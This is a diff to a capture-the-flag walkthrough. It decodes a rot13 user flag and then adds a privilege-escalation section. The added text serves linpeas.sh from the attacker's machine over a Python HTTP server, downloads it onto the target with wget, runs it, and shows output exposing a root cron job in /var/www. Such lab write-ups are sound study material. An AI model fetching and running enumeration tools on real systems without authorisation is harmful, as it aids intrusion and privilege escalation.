@@ -292,11 +292,88 @@ b----g@kral4-PC:~$ cat user.txt
 User Flag But It Seems Wrong Like It`s Rotated Or Something
 s--t{a--------------y}
 
-You sneaky guy, looks like i'll have to check to see if Swiss Army Knife is still sharp
+You sneaky guy, looks like i'll have to check to see if my Swiss Army Knife is still sharp
 
-Fortunately enough my knife is decided to run this as a rot13 and *Success*
+Fortunately enough my knife is, decided to run this as a rot13 and *Success*
 
 input: s--t{a--------------y}
 output: f--g{n--------------l}
 ```
 What is the root flag?
+
+Escalating privileges
+
+Automaion is always nice linpeas is my choice.
+
+started a http server using python3 as this is a good choice seeing as though it's installed
+
+on the machine.
+
+python3 -m http.server #on host machine#
+```
+python3 -m http.server                                                                                                                                
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+--.--.---.--- - - [08/Apr/2021 13:27:23] "GET /linpeas.sh HTTP/1.1" 200 -
+
+*Note in order for this to work you will need to be in the directory the file is in.
+```
+*-m runs Modules
+
+*http.server
+
+on the target machine I used
+
+wget --.-.---.--:8000/linpeas.sh
+```b----g@kral4-PC:~$ wget http://--.-.---.--:8000/linpeas.sh
+--2021-04-08 11:57:42--  http://--.-.---.--:8000/linpeas.sh
+Connecting to --.-.---.--:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 330159 (322K) [text/x-sh]
+Saving to: ‘linpeas.sh’
+
+linpeas.sh                                               100%[================================================================================================================================>] 322.42K   130KB/s    in 2.5s    
+
+2021-04-08 11:57:45 (130 KB/s) - ‘linpeas.sh’ saved [330159/330159]
+```
+
+Once this file is uploaded run a chmod +x linpeas.sh to make it executable
+
+*chmod +x linpeas.sh
+
+Now that the file is an executable you can run it by using
+
+*./linpeas.sh
+
+After a nice wait (this would be a good time to get another cup of coffee)
+```/etc/cron.monthly:
+total 24
+drwxr-xr-x   2 root root  4096 Apr 26  2018 .
+drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
+-rwxr-xr-x   1 root root   313 May 29  2017 0anacron
+-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
+
+/etc/cron.weekly:
+total 32
+drwxr-xr-x   2 root root  4096 Jun 14  2020 .
+drwxr-xr-x 121 root root 12288 Jun 15  2020 ..
+-rwxr-xr-x   1 root root   312 May 29  2017 0anacron
+-rwxr-xr-x   1 root root   723 Apr  7  2018 man-db
+-rw-r--r--   1 root root   102 Nov 15  2017 .placeholder
+-rwxr-xr-x   1 root root   211 Jul 12  2013 update-notifier-common
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+==* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh==
+
+
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+HOME=/root
+LOGNAME=root
+
+1       5       cron.daily      run-parts --report /etc/cron.daily
+7       10      cron.weekly     run-parts --report /etc/cron.weekly
+@monthly        15      cron.monthly    run-parts --report /etc/cron.monthly
+```
